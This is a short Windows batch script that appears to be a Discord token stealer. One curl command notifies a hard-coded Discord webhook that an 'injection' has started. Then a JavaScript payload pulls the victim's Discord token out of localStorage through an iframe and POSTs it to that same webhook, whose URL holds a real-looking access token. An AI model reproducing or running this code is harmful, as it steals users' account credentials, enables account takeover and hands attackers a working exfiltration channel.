@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" https://discord.com/api/webhooks/801539028683718667/jFZMiOF7PcfhkVpyf1oGGmKZM310jk63IdFOYezcha5JNa6JOEvX--ecuxluUj1BBNzM
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/801539028683718667/jFZMiOF7PcfhkVpyf1oGGmKZM310jk63IdFOYezcha5JNa6JOEvX--ecuxluUj1BBNzM', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
